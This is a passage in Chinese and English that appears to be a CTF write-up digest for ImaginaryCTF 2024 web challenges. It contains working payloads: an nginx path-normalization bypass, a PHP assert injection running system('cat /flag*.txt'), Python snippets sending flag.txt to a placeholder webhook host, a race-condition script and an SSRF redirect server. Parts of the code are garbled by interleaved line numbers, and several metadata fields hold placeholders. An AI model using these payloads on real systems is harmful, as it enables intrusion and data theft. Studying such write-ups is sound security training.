---
title: ImaginaryCTF 2024 [WEB]
contest: ImaginaryCTF
year: 2024
difficulty: easy
vuln_type: web_unknown
tags:
- nginx 路径规范化
- PHP assert 注入
- 命令注入
attack_chain: '|'
key_payload: '|'
one_liner: ImaginaryCTF 2024 Web 多题速查 (nginx 路径规范化 / Python 代码注入 / Hostname 报错 / PHP assert 注入 / maze 条件竞争)。
lesson: '|'
quality: medium
full_path: ImaginaryCTF_2024_[WEB].full.md
meta_path: ImaginaryCTF_2024_[WEB].meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: ImaginaryCTF 2024 [WEB]。ImaginaryCTF 2024 Web 多题速查 (nginx 路径规范化 / Python 代码注入 / Hostname 报错 / PHP assert 注入 / maze 条件竞争)。。经验：|
category: web
subcategory: web_other
tools_used:
- PHP
- Python
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/192407.html
reasoning_chain:
- readme 题 nginx 配置 → if (-f $request_filename) return 404; proxy_pass → 触发点：nginx 路径规范化
- 动作：echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc → 观察：nginx 把 \xA0 当合法字符绕过 -f 判断
- 观察：直接 GET flag.txt → 拿到 flag
- Journal：PHP assert("strpos('$file', '..') === false") or die(...) → 触发点：assert 代码注入
- 动作：file=file1.txt') or die(system('cat /flag*.txt'))// → 假设：闭合单引号 + 注入 die(system())
- 观察：flag 返回 → 完成
- Crystals：hostname=$FLAG → 触发点：docker-compose 环境变量泄漏
- 动作：触发 hostname 报错 → 假设：WEBrick 抛 LengthRequired 异常泄漏 hostname
- 动作：curl -XPOST → 观察：hostname 在错误信息中 → flag
- Amazing Race maze：maze ID 控制路径 → 触发点：35x35 maze + getLoc(mazeId)==(34,34)
- 假设：构造 maze ID 直接到终点 → 动作：分析 mazeId 解码（base64 grid）
- 动作：写 ID 让 getLoc 返回 (34,34) → 观察：flag
failed_attempts:
- 直接 curl /flag.txt → 失败：nginx return 404
- Journal 试双引号 → 失败：单引号闭合才生效
- maze 试 BFS 走 → 失败：路径不连续需拼接 ID
key_observations:
- nginx \xA0 \x0a 是路径规范化 bypass 经典（$request_filename 与 $uri 解析差异）
- PHP assert 在 7.x 是代码执行，在 8.x 改 warning 必须用 eval 替代
- docker-compose hostname=$FLAG 是常见 flag 注入方式
- maze 类题关键是 getLoc 公式反推
- WEBrick 错误信息可泄漏 hostname 环境变量
prerequisites:
- nginx 路径规范化与 location 匹配
- PHP assert 代码注入 + docker-compose 环境变量语法
- Python maze + Flask render_template
---
# ImaginaryCTF 2024 [WEB]

> 原文: https://www.ctfiot.com/192407.html
> ID: 192407


```
1
2
3
4
5
6
7
8
9
10
11
12
server {
 listen 80 default_server;
 listen [::]:80;
 root /app/public;

 location / {
 if (-f $request_filename) {
 return 404;
 }
 proxy_pass http://localhost:
8000;
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
└─$ curl http://readme.chal.imaginaryctf.org/
<!DOCTYPE html>
<html lang="en">
	<head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Hello World</title>
	</head>
	
 It works!
	
</html>
1
2
3
4
5
6
7
8
└─$ curl http://readme.chal.imaginaryctf.org/index.html
<html>
<head><title>404 Not Found</title></head>

<h1>404 Not Found</h1>
<hr>nginx/1.22.1

</html>
1
2
└─$ echo -e "GET /flag.txt\xA0\x0aHTTP/1.1" | nc readme.chal.imaginaryctf.org 80
ictf{path_normalization_to_the_res
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
<?php

echo "Welcome to my journal app!";
echo "<a href=/?file=file1.txt>file1.txt</a>";
echo "<a href=/?file=file2.txt>file2.txt</a>";
echo "<a href=/?file=file3.txt>file3.txt</a>";
echo "<a href=/?file=file4.txt>file4.txt</a>";
echo "<a href=/?file=file5.txt>file5.txt</a>";
echo "";

if (isset($_GET['file'])) {
 $file = $_GET['file'];
 $filepath = './files/' . $file;

 // This line look suspicious?
 assert("strpos('$file', '..') === false") or die("Invalid file!");

 if (file_exists($filepath)) {
 include($filepath);
 } else {
 echo 'File not found!';
 }
}

echo "";
1
2
3
4
5
# URL Encoded
test%27,%27..%27)%20or%20die(system(%27cat%20/flag*.txt%27));//

# Original
test','..') or die(system('cat /flag*.txt'));//
1
2
3
4
import base64,os
curl_content=b"/?content=`cat flag.txt |base64 -w0`")
1
2
3
4
5
6
7
8
9
# POST Method
from urllib.request import urlopen, Request
httprequest = Request('https://<WEBHOOK>/',data=open("flag.txt","r"),method='POST')
urlopen(httprequest)

# GET Method
from urllib.request import urlopen, Request
httprequest = Request('https://<WEBHOOK>/?='+open("flag.txt","r").read())
urlopen(httprequest)
1
2
3
4
5
6
require 'sinatra'

# Route for the index page
get '/' do
 erb :
index
end
1
2
3
4
5
6
7
version: '3.3'
services:
 deployment:
 hostname: $FLAG
 build: .
 ports:
 - 10001:80
1
2
3
4
5
└─$ curl -XPOST http://crystals.chal.imaginaryctf.org
WEBrick::
HTTPStatus::
LengthRequired: WEBrick::
HTTPStatus::
LengthRequired
	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:
530:in `read_body'
	/var/lib/gems/3.0.0/gems/webrick-1.8.1/lib/webrick/httprequest.rb:
257:in `body'
	/var/lib/gems/3.0.0/gems/rackup-2.1.0/lib/rackup/handler/webrick.rb:67:in `block in initialize'
1
2
3
4
5
6
7
8
9
10
11
# Script
for chars in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '+' '[' ']' '{' '}' ';' ':' '"' "'" '<' '>' ',' '.' '/' '?' '\\' '|' '`'; do echo $chars;echo;
curl -ks "http://crystals.chal.imaginaryctf.org/"$chars| grep -i ictf;done

# Characters with Bad URI
^
"
<
>
\
|
`
maze.py = /maze
app.py = /source
Dockerfile = /docker
1
2
3
4
5
6
7
8
9
10
11
12
13
14
MAZE_SIZE = 35

@app.route("/<mazeId>")
def index(mazeId):
 if not mazeId:
 return redirect(f"/{createMaze()}")
 # if our maze ID location equal to this value we can get the flag
 # getloc(mazeId) == (34,34)
 solved=getLoc(mazeId) == (MAZE_SIZE-1, MAZE_SIZE-1)
 return render_template("maze.html",
 maze=getMaze(mazeId),
 mazeId=mazeId,
 flag=open("flag.txt").read() if solved else ""
 )
1
2
3
4
5
def gen(self):
 ...
 self.set(*([self.size-1]*self.dim), val='F')
 for i in self.neighbors(*([self.size-1]*self.dim)):
 self.set(*i, val='#')
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
import sys,requests,threading
from bs4 import BeautifulSoup as bs
import time

# Global Variables
TARGET = "http://the-amazing-race.chal.imaginaryctf.org/"
TARGET_MOVE = "http://the-amazing-race.chal.imaginaryctf.org/move"
MAZE_ID = ""

# Function : getMaze()
def getMaze():
 resp = requests.get(TARGET,verify=False)
 soup=bs(resp.text, 'html.parser')
 maze = soup.find('code').text.strip()
 mazeid = resp.url.split("/")[-1]
 return maze,mazeid

def getCurrentMaze():
 resp = requests.get(TARGET,verify=False)
 soup=bs(resp.text, 'html.parser')
 maze = soup.find('code').text.strip()
 return maze

def moveDown():
 requests.post(TARGET_MOVE,verify=False,headers={"Content-Type":"application/x-www-form-urlencoded"},data={"Down":"Down"},params = {'id': MAZE_ID,'move': 'down'})

def moveRight():
 requests.post(TARGET_MOVE,verify=False,headers={"Content-Type":"application/x-www-form-urlencoded"},data={"Right":"Right"},params = {'id': MAZE_ID,'move': 'right'})

def moveLeft():
 requests.post(TARGET_MOVE,verify=False,headers={"Content-Type":"application/x-www-form-urlencoded"},data={"Left":"Left"},params = {'id': MAZE_ID,'move': 'left'})

def moveUp():
 requests.post(TARGET_MOVE,verify=False,headers={"Content-Type":"application/x-www-form-urlencoded"},data={"Up":"Up"},params = {'id': MAZE_ID,'move': 'up'})

if __name__ == "__main__":
 # Get Maze
 maze,MAZE_ID = getMaze()
 TARGET = TARGET+MAZE_ID
 print(maze)
 print()

 while ("ictf" not in requests.get(TARGET,verify=False).text):
 before = getCurrentMaze()
 # Race down
 for i in range(10):
 th = threading.Thread(target=moveDown, args=())
 th.start()

 # Race right
 for i in range(10):
 th = threading.Thread(target=moveRight, args=())
 th.start()

 after = getCurrentMaze()
 if before == after:
 moveLeft()
 moveUp()
 print(getCurrentMaze())
 print()
 else:
 print(getCurrentMaze())
 print()

 print(requests.get(TARGET,verify=False).text)
1
2
3
4
5
return fetch(new URL(url.pathname + url.search, 'http://localhost:
3000/'), {
 method: req.method,
 headers: req.headers,
 body: req.body
})
1
2
3
4
5
6
7
8
9
10
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
 return redirect("http://localhost:
3000/flag.txt")

if __name__ == '__main__':
 app.run(host="0.0.0.0", port=8080)
1
2
3
4
5
6
7
8
greet(Request) :-
 http_session_data(username(Username)),
 http_parameters(Request, [
 greeting(Greeting, [default('Hello')]),
 format(Format, [default('~w, ~w!')])
 ]),
 content_type,
 format(Format, [Greeting, Username]).
1
2
3
4
5
# Original
format(Format, [Greeting, Username])

# Input: greeting=Hello, format='~w, ~w!'
format('~w, ~w!', ['Hello', 'guest'])
edit/0 == will open the editor of server.pl locally (Cannot use remotely I guess?)

listing/0 == lists all predicates defined
1
2
3
4
5
6
7
8
9
10
11
12
login(Request) :-
 member(method(post), Request),
 http_read_data(Request, Data, []),
 ((
 member(username=Username, Data),
 member(password=Password, Data),
 users(Users),
 member(Username=Password, Users),
 http_session_retractall(_OldUsername),
 http_session_assert(username(Username)),
 http_redirect(see_other, '/greet', Request)
 );
1
2
3
4
member(guest='password',[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).

# Result
false.
1
2
3
4
member(guest=Unknownvariable,[guest=guest,'AzureDiamond'=hunter2,admin=AdminPass]).

# Result
Unknownvariable = guest . (true?)
[username=admin,password=Unknownvariable].
```
